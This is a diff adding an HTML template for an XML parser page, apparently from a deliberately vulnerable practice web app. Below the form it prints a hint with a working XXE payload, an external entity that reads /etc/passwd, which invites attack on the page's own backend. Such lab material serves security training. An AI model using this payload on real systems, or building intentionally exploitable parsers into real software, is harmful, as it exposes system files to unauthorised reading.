@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XML Parser</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
+        textarea { width: 100%; height: 200px; font-family: monospace; }
+        button { padding: 10px 20px; background: #5cb85c; color: white; border: none; cursor: pointer; }
+        pre { background: #f5f5f5; padding: 15px; border-radius: 4px; overflow-x: auto; }
+        .error { color: #d9534f; background: #f2dede; padding: 10px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1>📄 XML Parser</h1>
+    
+    <form method="POST">
+        <textarea name="xml" placeholder="Paste XML here..."><?xml version="1.0"?>
+<root>
+    <data>Hello World</data>
+</root></textarea>
+        <br><br>
+        <button type="submit">Parse XML</button>
+    </form>
+    
+    {% if result %}
+    <h3>Parsed Result:</h3>
+    <pre>{{ result }}</pre>
+    {% endif %}
+    
+    {% if error %}
+    <div class="error">
+        <strong>Error:</strong> {{ error }}
+    </div>
+    {% endif %}
+    
+    <p><a href="/">← Back to Home</a></p>
+    
+    <hr>
+    <p><em>Hint: Try XXE with:</em></p>
+    <pre><?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root></pre>
+</body>
+</html>
